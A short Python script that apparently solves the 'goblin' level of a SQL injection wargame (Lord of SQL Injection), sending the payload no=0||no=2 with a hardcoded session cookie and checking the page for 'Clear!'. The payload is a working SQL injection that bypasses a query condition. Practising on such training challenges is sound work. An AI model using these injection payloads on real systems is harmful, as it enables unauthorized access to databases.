from requests import get

url ="https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php"
cookie = {"PHPSESSID":"c0bed5cfkoofgp0l3nfhdr2c89"}
params = {
    "no":"0||no=2"
}

if get(url,params=params,cookies=cookie).text.find("Clear!") > 0:
    print("[*] Success")
